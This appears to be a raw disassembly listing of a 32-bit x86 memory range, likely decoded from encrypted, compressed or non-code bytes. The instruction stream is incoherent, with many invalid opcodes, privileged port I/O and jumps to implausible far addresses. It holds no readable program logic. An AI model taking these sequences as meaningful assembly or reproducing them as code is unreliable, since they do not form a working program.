  416995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416996:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416998:	pop    ds
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0xd570707e
  4169a0:	xchg   BYTE PTR [esi],bl
  4169a2:	and    DWORD PTR [ebx+0x4a],0xfd3d9a50
  4169a9:	push   ebx
  4169aa:	lds    edx,FWORD PTR [edi-0xd2ed120]
  4169b0:	inc    ecx
  4169b1:	outs   dx,BYTE PTR ds:[esi]
  4169b2:	loope  0x416972
  4169b4:	int3   
  4169b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169b6:	arpl   WORD PTR [ebx],bx
  4169b8:	loope  0x4169dc
  4169ba:	xlat   BYTE PTR ds:[ebx]
  4169bb:	mov    di,sp
  4169be:	icebp  
  4169bf:	and    BYTE PTR [edx-0x56],0x8e
  4169c3:	std    
  4169c4:	in     eax,dx
  4169c5:	or     ebp,DWORD PTR [ecx-0x6e]
  4169c8:	pusha  
  4169c9:	lds    eax,FWORD PTR [ebx-0x43dca466]
  4169cf:	inc    ecx
  4169d0:	sbb    DWORD PTR [edx-0x1278da2c],edi
  4169d6:	pop    esp
  4169d7:	push   eax
  4169d8:	mov    ah,BYTE PTR [ebp-0x3f]
  4169db:	cs ret 0xeae
  4169df:	scas   eax,DWORD PTR es:[edi]
  4169e0:	adc    ch,BYTE PTR [edx]
  4169e2:	jne    0x4169df
  4169e4:	jmp    0x2a960cde
  4169e9:	dec    esi
  4169ea:	mov    bl,ch
  4169ec:	pop    eax
  4169ed:	stos   BYTE PTR es:[edi],al
  4169ee:	test   BYTE PTR [esi+0x4109cf34],0x52
  4169f5:	nop
  4169f6:	mov    eax,ds:0x3429e0ce
  4169fb:	mov    bl,BYTE PTR [edi+0x5720dab9]
  416a01:	mov    ebp,0xd5a21f97
  416a06:	and    eax,DWORD PTR [ebx-0x4a]
  416a09:	xchg   ecx,eax
  416a0a:	pop    eax
  416a0b:	loopne 0x41699b
  416a0d:	cmp    DWORD PTR [bx+0x6c29],0xffffffc3
  416a13:	pop    ss
  416a14:	xor    al,0x8d
  416a16:	in     al,0xf8
  416a18:	jle    0x4169e1
  416a1a:	fs ret 0xbda0
  416a1e:	xor    ebx,ecx
  416a20:	imul   ecx,DWORD PTR [edi],0x37
  416a23:	xchg   esi,eax
  416a24:	hlt    
  416a25:	sbb    BYTE PTR [ecx+eiz*4-0x1c218d5],dl
  416a2c:	scas   eax,DWORD PTR es:[edi]
  416a2d:	imul   ebp,DWORD PTR [edx+0x61],0x3285fbcd
  416a34:	out    0x21,al
  416a36:	add    eax,0xf2b39a67
  416a3b:	push   ds
  416a3c:	xchg   edx,eax
  416a3d:	aad    0xb5
  416a3f:	push   0xffffffdf
  416a41:	out    dx,eax
  416a42:	fs or  esp,esi
  416a45:	fcos   
  416a47:	ret    0x98d5
  416a4a:	xor    DWORD PTR [ecx+0x17],edi
  416a4d:	mov    ecx,0x8aad92a6
  416a52:	push   ebx
  416a53:	(bad)  
  416a54:	mov    cl,BYTE PTR [edx-0x7d]
  416a57:	pop    edi
  416a58:	shr    bl,0x7
  416a5b:	shr    BYTE PTR [ecx+0x23],0xab
  416a5f:	cs test ah,bh
  416a62:	add    ah,BYTE PTR [eax]
  416a64:	push   ebp
  416a65:	push   0xfffffff5
  416a67:	jg     0x416a77
  416a69:	jle    0x4169f2
  416a6b:	loopne 0x416a96
  416a6d:	ror    DWORD PTR [esi-0x187e610f],0x87
  416a74:	das    
  416a75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a76:	data16 jne 0x416ad5
  416a79:	dec    edx
  416a7a:	or     edi,esp
  416a7c:	lds    esi,FWORD PTR [esi-0x290dad80]
  416a82:	dec    ecx
  416a83:	push   0x22d2f544
  416a88:	shl    cl,1
  416a8a:	pushf  
  416a8b:	ss ret 
  416a8d:	bound  ebp,QWORD PTR [eax+0x5aa93f49]
  416a93:	jo     0x416a46
  416a95:	dec    esi
  416a96:	jae    0x416af0
  416a98:	pop    edx
  416a99:	or     eax,0x73bdcb1d
  416a9e:	in     eax,dx
  416a9f:	(bad)  
  416aa0:	loop   0x416ab7
  416aa2:	data16 sub al,0x18
  416aa5:	pop    eax
  416aa6:	jge    0x416a76
  416aa8:	stc    
  416aa9:	dec    eax
  416aaa:	(bad)  
  416aab:	jmp    0x274a:0x3439ad65
  416ab2:	sahf   
  416ab3:	xchg   ebp,eax
  416ab4:	push   esi
  416ab5:	push   0x6b50e752
  416aba:	es mov dl,0x71
  416abd:	pop    edx
  416abe:	sbb    DWORD PTR [ecx+0x3d],0x5b
  416ac2:	mov    DWORD PTR [ebp+0x209829ae],ebp
  416ac8:	jb     0x416b45
  416aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416acb:	mov    eax,0x95bd217
  416ad0:	fadd   DWORD PTR [ebx-0x29abad]
  416ad6:	imul   esp,DWORD PTR [ebx+0x776a6edd],0xffffffda
  416add:	jle    0x416b11
  416adf:	pop    eax
  416ae0:	fs pop ss
  416ae2:	push   ds
  416ae3:	sar    DWORD PTR [ecx+edx*8-0x5e],0x4d
  416ae8:	les    ebx,FWORD PTR [eax+0x4d]
  416aeb:	test   al,0x55
  416aed:	and    ecx,0xffffff96
  416af0:	loopne 0x416b1d
  416af2:	fs pop esp
  416af4:	popa   
  416af5:	int    0x9c
  416af7:	sbb    edx,esp
  416af9:	stos   DWORD PTR es:[edi],eax
  416afa:	dec    ecx
  416afb:	jnp    0x416b0d
  416afd:	jecxz  0x416b17
  416aff:	pop    eax
  416b00:	mov    DWORD PTR [ebp-0x6b],eax
  416b03:	adc    bl,BYTE PTR [ebp+0x62bc4f6b]
  416b09:	fiadd  DWORD PTR [edi-0x72]
  416b0c:	inc    ecx
  416b0d:	pushf  
  416b0e:	push   ss
  416b0f:	jb     0x416ae8
  416b11:	push   edi
  416b12:	pop    ebx
  416b13:	hlt    
  416b14:	iret   
  416b15:	push   edx
  416b16:	in     al,dx
  416b17:	je     0x416aaa
  416b19:	mov    cl,0x26
  416b1b:	cdq    
  416b1c:	mov    eax,0x6059a02c
  416b21:	gs jbe 0x416ae1
  416b24:	jno    0x416af2
  416b26:	inc    ecx
  416b27:	iret   
  416b28:	leave  
  416b29:	mov    al,0x9
  416b2b:	jb     0x416ae6
  416b2d:	cwde   
  416b2e:	cmp    eax,0x4ac40c35
  416b33:	pop    es
  416b34:	add    eax,0xee1ea496
  416b39:	xor    al,0xf5
  416b3b:	jl     0x416b37
  416b3d:	mov    ss,edi
  416b3f:	inc    edi
  416b40:	mov    es,WORD PTR [eax+0x452f981]
  416b46:	jb     0x416bad
  416b48:	cld    
  416b49:	jno    0x416ae7
  416b4b:	mov    bh,0xbd
  416b4d:	sahf   
  416b4e:	mov    ds,WORD PTR [eax+0x1402d0f]
  416b54:	shr    BYTE PTR [esi-0x1cf25fc5],cl
  416b5a:	hlt    
  416b5b:	aaa    
  416b5c:	imul   ebx,ecx,0x8ae46659
  416b62:	imul   edx,ebx,0x827ea0a3
  416b68:	leave  
  416b69:	add    eax,0x7864568f
  416b6e:	mov    DWORD PTR [esi+0x21],esi
  416b71:	ins    BYTE PTR es:[edi],dx
  416b72:	outs   dx,DWORD PTR ds:[esi]
  416b73:	inc    ebp
  416b74:	inc    eax
  416b75:	and    al,0xc0
  416b77:	and    BYTE PTR [ebx+0x4f],ah
  416b7a:	adc    ah,BYTE PTR [ebx]
  416b7c:	xchg   esp,eax
  416b7d:	into   
  416b7e:	dec    edi
  416b7f:	inc    esp
  416b80:	ror    BYTE PTR [ebx-0x4f],cl
  416b83:	rcr    DWORD PTR [edx+0x1d],0x95
  416b87:	std    
  416b88:	and    cl,BYTE PTR [esi-0x34]
  416b8b:	pop    esi
  416b8c:	cmc    
  416b8d:	cwde   
  416b8e:	pop    ebx
  416b8f:	mov    esp,ebx
  416b91:	push   esp
  416b92:	mov    cs,WORD PTR [edx]
  416b94:	dec    esp
  416b95:	jae    0x416bb4
  416b97:	das    
  416b98:	std    
  416b99:	icebp  
  416b9a:	pop    es
  416b9b:	fmul   st(4),st
  416b9e:	push   esi
  416b9f:	mov    DWORD PTR [bp+si+0x41],ebx
  416ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ba4:	aad    0x7a
  416ba6:	push   edx
  416ba7:	mov    ds:0xa1e82fe,al
  416bac:	xchg   ebx,eax
  416bad:	pop    esp
  416bae:	pop    es
  416baf:	out    dx,al
  416bb0:	and    al,0x37
  416bb2:	mov    ebx,0x9d84adf4
  416bb7:	jbe    0x416bfc
  416bb9:	pop    eax
  416bba:	fst    QWORD PTR [ecx+ebx*4]
  416bbd:	sub    BYTE PTR [ecx-0xc4c2963],bh
  416bc3:	bswap  esp
  416bc5:	rcr    DWORD PTR [ecx+ebx*4+0x9],0x94
  416bca:	mov    bl,0x93
  416bcc:	aad    0xce
  416bce:	aad    0x37
  416bd0:	xchg   edi,eax
  416bd1:	add    dl,bl
  416bd3:	loopne 0x416c17
  416bd5:	cmp    cl,BYTE PTR [edx]
  416bd7:	(bad)  
  416bd8:	mov    ds:0x73273ac0,al
  416bdd:	jge    0x416c55
  416bdf:	ret    
  416be0:	in     al,dx
  416be1:	mov    edx,DWORD PTR [edi]
  416be3:	add    bl,0xdb
  416be6:	les    edx,FWORD PTR [ecx+0x3f9a9d91]
  416bec:	bndstx [esp+edi*2+0x3b6ea9fe],bnd1
  416bf4:	out    dx,al
  416bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bf6:	sar    BYTE PTR ds:0x53c9255c,0xf3
  416bfd:	adc    al,0x94
  416bff:	xchg   esi,eax
  416c00:	imul   edi,DWORD PTR [edx+0x4e],0x8377a901
  416c07:	mov    ecx,DWORD PTR [eax]
  416c09:	xor    eax,0xa5fe071e
  416c0e:	mov    eax,0x9093a749
  416c13:	or     cl,BYTE PTR [edx+eiz*1]
  416c16:	dec    esi
  416c17:	popf   
  416c18:	test   eax,0x9ec8a14
  416c1d:	mov    BYTE PTR [eax+edx*8+0x41],bl
  416c21:	mov    cs,eax
  416c23:	pop    ebx
  416c24:	and    DWORD PTR [eax+0x43754fde],eax
  416c2a:	push   edx
  416c2b:	sahf   
  416c2c:	out    0x6d,al
  416c2e:	icebp  
  416c2f:	mov    edx,0xea8dd923
  416c34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c35:	jle    0x416bf8
  416c37:	push   eax
  416c38:	inc    esi
  416c39:	and    edx,DWORD PTR [eax-0x75764a7c]
  416c3f:	neg    BYTE PTR [ebx-0xa]
  416c42:	xlat   BYTE PTR ds:[ebx]
  416c43:	popa   
  416c44:	je     0x416c12
  416c46:	sbb    DWORD PTR [ebx+0x10],esp
  416c49:	pop    eax
  416c4a:	mov    eax,ds:0x85e56751
  416c4f:	imul   DWORD PTR [ecx-0x7a]
  416c52:	cdq    
  416c53:	pop    esp
  416c54:	adc    al,0x9b
  416c56:	repnz (bad) 
  416c58:	pushf  
  416c59:	dec    ebp
  416c5a:	cmp    cl,BYTE PTR [ecx+0x6f32c628]
  416c60:	sub    BYTE PTR [edi+0x682301cc],0x49
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	adc    al,0x8f
  416c7d:	mov    eax,0x7f1cee8b
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c33
  416c88:	cs add edx,edx
  416c8b:	cs sbb al,0xb1
  416c8e:	jns    0x416d0c
  416c90:	jmp    0x19a085ef
  416c95:	fistp  QWORD PTR [ebp+0x1d3dc5bf]
  416c9b:	push   ss
  416c9c:	call   sp
  416c9f:	fs jb  0x416c73
  416ca2:	les    eax,FWORD PTR [ebx+0x71]
  416ca5:	repnz pop ebp
  416ca7:	or     al,0x92
  416ca9:	sbb    eax,DWORD PTR [esi+ebx*2+0x115c8883]
  416cb0:	scas   eax,DWORD PTR es:[edi]
  416cb1:	or     al,0x87
  416cb3:	xor    eax,0x111aed11
  416cb8:	or     esp,edi
  416cba:	addr16 test eax,0xb1e98b
  416cc0:	push   ss
  416cc1:	fidivr WORD PTR [eax-0x4e4ecc1]
  416cc7:	xchg   edx,eax
  416cc8:	mov    eax,ds:0x201dc1ea
  416ccd:	xor    BYTE PTR [edi],bh
  416ccf:	or     eax,0xdc5e0065
  416cd4:	xor    al,0xd
  416cd6:	lods   al,BYTE PTR ds:[esi]
  416cd7:	xchg   esi,eax
  416cd8:	mov    cs,WORD PTR [ecx]
  416cda:	ss sub ch,0x66
  416cde:	mov    fs,WORD PTR [esi+0x78fe182]
  416ce4:	mov    edx,0xa4ef2746
  416ce9:	call   DWORD PTR [ecx-0x74bfc41e]
  416cef:	dec    ebp
  416cf0:	dec    ecx
  416cf1:	lock test BYTE PTR [ebx],bl
  416cf4:	mov    cl,0xa8
  416cf6:	jbe    0x416d27
  416cf8:	mov    eax,ds:0x80fa663c
  416cfd:	pop    es
  416cfe:	shl    BYTE PTR [edx],1
  416d00:	js     0x416d48
  416d02:	and    BYTE PTR [esi-0x67],ch
  416d05:	cdq    
  416d06:	mov    esi,0x760159ce
  416d0b:	in     al,0x26
  416d0d:	imul   BYTE PTR [esi-0x50]
  416d10:	popf   
  416d11:	data16 mov WORD PTR [edi-0x45dbddef],fs
  416d18:	retf   0xe601
  416d1b:	int3   
  416d1c:	into   
  416d1d:	(bad)  
  416d1e:	push   0x7e
  416d20:	int    0x35
  416d22:	jmp    0x1837:0xa24b96ba
  416d29:	inc    ecx
  416d2a:	out    0xeb,al
  416d2c:	ins    BYTE PTR es:[edi],dx
  416d2d:	adc    al,0xf6
  416d2f:	in     eax,0x65
  416d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d32:	(bad)  
  416d33:	icebp  
  416d34:	sub    DWORD PTR [esi+0x423240bb],0x1df0a2be
  416d3e:	sbb    eax,0x5cb34d82
  416d43:	pop    ss
  416d44:	mov    DWORD PTR [eax],edx
  416d46:	inc    esi
  416d47:	pop    ss
  416d48:	push   esi
  416d49:	add    bl,dh
  416d4b:	push   ebx
  416d4c:	out    0x36,al
  416d4e:	push   ds
  416d4f:	pop    esi
  416d50:	mov    ebx,0xc19268d6
  416d55:	add    eax,0x8eeb4206
  416d5a:	pop    ds
  416d5b:	adc    ebx,edi
  416d5d:	cmp    edi,ebx
  416d5f:	jo     0x416d77
  416d61:	bound  edx,QWORD PTR [ebx]
  416d63:	es sbb eax,0xfd24ea3d
  416d69:	sbb    edx,DWORD PTR [esi+0x59]
  416d6c:	jl     0x416d05
  416d6e:	call   0x9b9b:0xabb997b3
  416d75:	pop    ebp
  416d76:	gs adc ebx,edx
  416d79:	xor    BYTE PTR [edx-0x18],bl
  416d7c:	imul   esi,DWORD PTR [ebx],0x33
  416d7f:	mov    bh,0xab
  416d81:	push   edx
  416d82:	out    0xf4,eax
  416d84:	fstp   TBYTE PTR [esi]
  416d86:	fdiv   DWORD PTR [ecx+0x61]
  416d89:	popf   
  416d8a:	cld    
  416d8b:	adc    ch,BYTE PTR [ecx+0xdb1e383]
  416d91:	dec    esi
  416d92:	loop   0x416dbe
  416d94:	in     al,0xb3
  416d96:	ja     0x416d2e
  416d98:	aad    0x77
  416d9a:	loopne 0x416dba
  416d9c:	stos   DWORD PTR es:[edi],eax
  416d9d:	ret    
  416d9e:	push   esi
  416d9f:	push   ds
  416da0:	push   ebx
  416da1:	xchg   edi,eax
  416da2:	ja     0x416dee
  416da4:	mov    cl,0x8e
  416da6:	ret    
  416da7:	jg     0x416d67
  416da9:	cmp    BYTE PTR [ebx-0x34],dl
  416dac:	sub    esp,DWORD PTR [edx-0x212e8d2b]
  416db2:	out    dx,eax
  416db3:	mov    edi,0x88857f16
  416db8:	sahf   
  416db9:	or     al,0xb3
  416dbb:	or     eax,0xcecbde7a
  416dc0:	iret   
  416dc1:	add    ch,BYTE PTR [edx-0x4541c662]
  416dc7:	jecxz  0x416d58
  416dc9:	lds    esp,FWORD PTR [esi+eax*1-0x26]
  416dcd:	cwde   
  416dce:	add    ah,BYTE PTR [edi]
  416dd0:	in     eax,0x5d
  416dd2:	fisub  DWORD PTR [eax-0x5b]
  416dd5:	cmp    BYTE PTR [eax+0x19],0x36
  416dd9:	ret    0x7f7e
  416ddc:	sbb    bh,BYTE PTR [ecx-0x53]
  416ddf:	fistp  DWORD PTR [ecx+eiz*1+0x51]
  416de3:	sbb    dh,dh
  416de5:	fwait
  416de6:	cmc    
  416de7:	jo     0x416e17
  416de9:	jle    0x416d81
  416deb:	pushf  
  416dec:	cmp    ah,BYTE PTR [ecx+edx*1+0x7b5684cd]
  416df3:	add    esp,esp
  416df5:	cmp    ch,BYTE PTR [ebx+0xb]
  416df8:	push   ds
  416df9:	jno    0x416e15
  416dfb:	inc    edi
  416dfc:	add    ebx,edx
  416dfe:	out    dx,al
  416dff:	add    ecx,eax
  416e01:	out    0x2a,al
  416e03:	in     al,0xc6
  416e05:	adc    esi,DWORD PTR [esi]
  416e07:	mov    WORD PTR [ebx+0x69],?
  416e0a:	fwait
  416e0b:	push   esp
  416e0c:	push   cs
  416e0d:	mov    ch,BYTE PTR [esi]
  416e0f:	pushf  
  416e10:	(bad)  
  416e12:	clc    
  416e13:	daa    
  416e14:	in     eax,0xee
  416e16:	push   ebp
  416e17:	push   ss
  416e18:	adc    eax,0x45fe901c
  416e1d:	inc    edi
  416e1e:	imul   ebp,ecx,0xe627247e
  416e24:	add    DWORD PTR [esi+0x59],esp
  416e27:	mov    edx,0x62128edb
  416e2c:	mov    DWORD PTR [eax+eiz*4-0x18c7e43a],ecx
  416e33:	or     bl,BYTE PTR [edi+edx*8]
  416e36:	fyl2xp1 
  416e38:	mov    DWORD PTR [ecx],0x1386ab8a
  416e3e:	mov    ds:0xcd7beb39,al
  416e43:	(bad)  
  416e44:	scas   al,BYTE PTR es:[edi]
  416e45:	mov    esp,0x136e6f0a
  416e4a:	sbb    DWORD PTR [bx+si+0x30],eax
  416e4e:	and    al,0x14
  416e50:	adc    ah,BYTE PTR [ebx+0x27]
  416e53:	gs xchg esp,eax
  416e55:	jp     0x416e01
  416e57:	jge    0x416e07
  416e59:	ss mov dl,0x10
  416e5c:	mov    ?,WORD PTR [esi-0x280d1a5a]
  416e62:	repz (bad) 
  416e64:	cmp    al,0x42
  416e66:	int    0x31
  416e68:	ret    
  416e69:	pop    esi
  416e6a:	cli    
  416e6b:	cdq    
  416e6c:	mov    BYTE PTR [ecx-0x68],ch
  416e6f:	and    dl,BYTE PTR ds:0xd30b1bbe
  416e75:	jle    0x416e8e
  416e77:	data16 mov db7,edi
  416e7b:	mov    dl,0x12
  416e7d:	mov    eax,ds:0xa62b4b2f
  416e82:	call   0x91f23da8
  416e87:	dec    ecx
  416e88:	sahf   
  416e89:	mov    dh,BYTE PTR [ebx]
  416e8b:	sbb    cl,BYTE PTR [ebp+0x25500d75]
  416e91:	mov    ch,0x68
  416e93:	pop    esi
  416e94:	push   0x46
  416e96:	pop    edx
  416e97:	in     al,0xf7
  416e99:	xlat   BYTE PTR ds:[ebx]
  416e9a:	pop    ecx
  416e9b:	js     0x416e3b
  416e9d:	adc    dh,cl
  416e9f:	leave  
  416ea0:	das    
  416ea1:	xchg   esi,eax
  416ea2:	test   al,0x45
  416ea4:	aaa    
  416ea5:	shl    ebp,cl
  416ea7:	mov    ch,0x9d
  416ea9:	sub    ebx,DWORD PTR [ebx]
  416eab:	imul   eax,DWORD PTR [esi+0x78],0x6a
  416eaf:	(bad)  
  416eb1:	xchg   esi,eax
  416eb2:	adc    DWORD PTR [ebx+0x2e01af43],esi
  416eb8:	or     eax,0x6592a489
  416ebd:	int    0xf7
  416ebf:	push   cs
  416ec0:	xchg   ebx,eax
  416ec1:	rcr    BYTE PTR [edx+0x43d82bc1],cl
  416ec7:	mov    bh,0xf5
  416ec9:	lods   eax,DWORD PTR ds:[esi]
  416eca:	or     DWORD PTR [ebx+0x56d0a7fe],eax
  416ed0:	dec    ebp
  416ed1:	inc    esp
  416ed2:	dec    eax
  416ed3:	push   0x3f5d324b
  416ed8:	cmc    
  416ed9:	and    al,dh
  416edb:	test   BYTE PTR [ebp-0x46b15056],al
  416ee1:	out    dx,al
  416ee2:	mov    BYTE PTR [ebx+0x30],dh
  416ee5:	or     DWORD PTR [edi-0x53],eax
  416ee8:	loop   0x416f4d
  416eea:	mov    eax,ds:0x8e7c98c1
  416eef:	ss clc 
  416ef1:	xor    BYTE PTR [ebx],0xfb
  416ef4:	nop
  416ef5:	stos   BYTE PTR es:[edi],al
  416ef6:	pop    esp
  416ef7:	xlat   BYTE PTR ds:[ebx]
  416ef8:	(bad)  
  416ef9:	fcmovnu st,st(2)
  416efb:	sbb    ah,BYTE PTR [esi-0x46]
  416efe:	mov    ah,0x8c
  416f00:	pusha  
  416f01:	pop    esp
  416f02:	pop    ss
  416f03:	pop    ebp
  416f04:	je     0x416f61
  416f06:	or     DWORD PTR [esi+0xacae885],0x344106e4
  416f10:	pop    eax
  416f11:	addr16 xchg edx,eax
  416f13:	push   0x66
  416f15:	out    dx,eax
  416f16:	push   ebx
  416f17:	jmp    0x416ebc
  416f19:	repz sbb BYTE PTR [edi-0x215902cd],dh
  416f20:	in     eax,dx
  416f21:	sbb    eax,0xbfca623a
  416f26:	rcr    DWORD PTR [ebp-0x44c9bf23],0x47
  416f2d:	pop    es
  416f2e:	addr16 mov edx,esp
  416f31:	sahf   
  416f32:	arpl   WORD PTR [esp+ebp*2+0x5523b468],bp
  416f39:	aas    
  416f3a:	push   ecx
  416f3b:	dec    eax
  416f3c:	sbb    DWORD PTR [ebx-0x65],esi
  416f3f:	add    BYTE PTR [ebx],dh
  416f41:	xor    DWORD PTR [ecx-0xb],0xa1479a64
  416f48:	je     0x416f45
  416f4a:	add    BYTE PTR [esi+0x61],dl
  416f4d:	or     BYTE PTR [edi],0xaf
  416f50:	rol    DWORD PTR [ebx],0xe0
  416f53:	xchg   edx,eax
  416f54:	push   eax
  416f55:	xor    ebx,ebx
  416f57:	mov    edx,esp
  416f59:	jmp    0x41723d
  416f5e:	cmp    al,0x58
  416f60:	push   esp
  416f61:	add    dh,BYTE PTR [edx+esi*1+0x4a]
  416f65:	data16 (bad) 
  416f68:	and    ch,cl
  416f6a:	fcmovne st,st(3)
  416f6c:	test   al,0xc5
  416f6e:	aaa    
  416f6f:	sbb    DWORD PTR [edi+0x70],edi
  416f72:	mov    ecx,0xc970707e
  416f77:	rcr    BYTE PTR [ecx],1
  416f79:	xchg   esi,eax
  416f7a:	out    0x68,al
  416f7c:	stos   DWORD PTR es:[edi],eax
  416f7d:	rcl    DWORD PTR [ebx-0x44226547],0xfc
  416f84:	mov    esp,0xa26471cb
  416f89:	test   al,0x4e
  416f8b:	dec    eax
  416f8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f8d:	iret   
  416f8e:	mov    DWORD PTR [ebp+0x66],edx
  416f91:	pop    esi
  416f92:	xchg   edx,eax
  416f93:	cmp    bh,ch
  416f95:	int    0x8f
  416f97:	jmp    0x7c9e:0xdf9bbe8d
  416f9e:	test   BYTE PTR [eax-0x41],dl
  416fa1:	or     edx,ebp
  416fa3:	dec    eax
  416fa4:	outs   dx,DWORD PTR ds:[esi]
  416fa5:	adc    eax,DWORD PTR [ebp+eax*4-0x30f60972]
  416fac:	shr    DWORD PTR [eax-0x4df8e0bf],0xe4
  416fb3:	out    0xab,eax
  416fb5:	sub    dh,BYTE PTR [edx]
  416fb7:	js     0x416fc3
  416fb9:	sub    esp,0x68
  416fbc:	(bad)  
  416fbd:	adc    edi,ebx
  416fbf:	sub    al,0xd9
  416fc1:	pop    edx
  416fc2:	sar    DWORD PTR [ebx+0x75],1
  416fc5:	fdivr  st,st(4)
  416fc7:	cs scas eax,DWORD PTR es:[edi]
  416fc9:	jb     0x416fec
  416fcb:	sbb    BYTE PTR [ebx-0x6],ch
  416fce:	in     eax,0xf7
  416fd0:	mov    WORD PTR [esp+ecx*8],fs
  416fd3:	in     al,0x68
  416fd5:	mov    esp,0xc7b49e4
  416fda:	clc    
  416fdb:	jae    0x417004
  416fdd:	add    al,0xe2
  416fdf:	jge    0x417059
  416fe1:	xor    eax,0x7aa6c64e
  416fe6:	push   es
  416fe7:	dec    eax
  416fe8:	dec    edi
  416fe9:	repnz xchg esp,eax
  416feb:	pop    edx
  416fec:	mov    ebp,0x3212b046
  416ff1:	shl    DWORD PTR [esp+eax*1-0x226ce2b1],0x2e
  416ff9:	imul   ebp,esi,0x433dfdf6
  416fff:	addr16 test al,0x7a
  417002:	mov    DWORD PTR [esi],ebp
  417004:	mov    ds,WORD PTR ds:0x3a8822c8
  41700a:	mov    cl,0xad
  41700c:	std    
  41700d:	out    dx,al
  41700e:	pop    esp
  41700f:	pop    ebp
  417010:	ds jae 0x41708a
  417013:	test   BYTE PTR [edx],al
  417015:	(bad)  
  417016:	scas   al,BYTE PTR es:[edi]
  417017:	lods   eax,DWORD PTR ss:[si]
  41701a:	jl     0x416fde
  41701c:	mov    al,0x3e
  41701e:	mov    esp,0x4f876b3b
  417023:	push   0x1a270ede
  417028:	pop    ds
  417029:	js     0x416fb6
  41702b:	jmp    0x649b:0xbfb9db43
  417032:	out    0xfc,eax
  417034:	mov    BYTE PTR [ebx-0x60],bh
  417037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417038:	je     0x4170b7
  41703a:	test   DWORD PTR ds:0xb307595e,eax
  417040:	xchg   edx,eax
  417041:	sti    
  417042:	aas    
  417043:	pushf  
  417044:	xor    DWORD PTR [ebx-0x5a],ebx
  417047:	data16 mov ch,0x3d
  41704a:	repz std 
  41704c:	stos   DWORD PTR es:[edi],eax
  41704d:	jno    0x4170b5
  41704f:	push   0x2c
  417051:	pop    ebx
  417052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417053:	push   ebx
  417054:	pop    ebp
  417055:	mov    ch,0xb0
  417057:	add    BYTE PTR [esi],bh
  417059:	cmp    BYTE PTR [edi+eax*8+0x5d],dh
  41705d:	jmp    0x4170a7
  41705f:	(bad)  
  417060:	inc    ebx
  417061:	sbb    DWORD PTR [edi+0x15d2d12],esp
  417067:	xlat   BYTE PTR ds:[ebx]
  417068:	jecxz  0x4170af
  41706a:	jge    0x41702d
  41706c:	sti    
  41706d:	gs adc ch,bl
  417070:	sbb    DWORD PTR [edx+0x1020f3fc],0xffffffce
  417077:	int    0x90
  417079:	mov    ebp,0x29505c6b
  41707e:	aad    0x89
  417080:	push   ecx
  417081:	cmp    ah,BYTE PTR [ebx]
  417083:	int3   
  417084:	or     dl,BYTE PTR [ebp+0x1e548ee6]
  41708a:	mov    eax,ds:0x362c4e04
  41708f:	and    cl,BYTE PTR [ebp+0x3feea7c5]
  417095:	add    al,0xb4
  417097:	les    esp,FWORD PTR [ecx]
  417099:	lods   al,BYTE PTR ds:[esi]
  41709a:	mov    ds:0x6f16121f,eax
  41709f:	jb     0x4170dc
  4170a1:	push   es
  4170a2:	imul   esp,DWORD PTR [eax],0x1c791fae
  4170a8:	jb     0x4170e9
  4170aa:	jmp    0x417051
  4170ac:	xchg   edx,eax
  4170ad:	push   es
  4170ae:	sbb    ebx,edx
  4170b0:	sahf   
  4170b1:	pop    si
  4170b3:	cmc    
  4170b4:	cmp    ecx,DWORD PTR [ebp-0x49]
  4170b7:	inc    edi
  4170b8:	add    ah,BYTE PTR ds:0x911bfeb
  4170be:	mov    ebx,0x81d0528e
  4170c3:	outs   dx,DWORD PTR ds:[esi]
  4170c5:	cmp    DWORD PTR ds:0xf7af9bf5,ebx
  4170cb:	in     al,0x35
  4170cd:	daa    
  4170ce:	pusha  
  4170cf:	into   
  4170d0:	call   0x6b98:0x25115e50
  4170d7:	mov    ecx,0x9842ce4e
  4170dc:	in     al,dx
  4170dd:	es cmp al,0x2
  4170e0:	fs dec edx
  4170e2:	mov    eax,ds:0x708dc490
  4170e7:	or     BYTE PTR [ebp+0x5a],bl
  4170ea:	icebp  
  4170eb:	and    BYTE PTR [ebx-0x4c],bl
  4170ee:	pop    edi
  4170ef:	cdq    
  4170f0:	add    dl,bh
  4170f2:	in     al,0x11
  4170f4:	inc    esp
  4170f5:	jae    0x417149
  4170f7:	add    al,0x6d
  4170f9:	leave  
  4170fa:	fwait
  4170fb:	add    al,0xba
  4170fd:	mov    al,fs:0x581898fa
  417103:	adc    al,0x34
  417105:	mov    ah,0xd5
  417107:	rol    dh,0xbf
  41710a:	inc    ecx
  41710b:	mov    ds:0x59c47f4a,al
  417110:	dec    edi
  417111:	push   edi
  417112:	sub    ch,BYTE PTR [ecx+0x42]
  417115:	jnp    0x417105
  417117:	push   0x76e7e6b0
  41711c:	(bad)  
  41711d:	daa    
  41711e:	out    0x7b,eax
  417120:	(bad)  [eax+0x72c5da95]
  417126:	sbb    BYTE PTR [esi+0x4059c003],dl
  41712c:	adc    eax,0x62dfca24
  417131:	popa   
  417132:	shl    dh,cl
  417134:	out    0x83,eax
  417136:	mov    ecx,0xcc79bc65
  41713b:	sub    edx,DWORD PTR [ecx-0x32]
  41713e:	mov    ah,0x87
  417140:	lods   al,BYTE PTR ds:[esi]
  417141:	cs jb  0x41714e
  417144:	(bad)  
  417145:	pushf  
  417146:	test   eax,0x8d6b75eb
  41714b:	mov    ch,0x24
  41714d:	pop    edi
  41714e:	es (bad) 
  417150:	pushf  
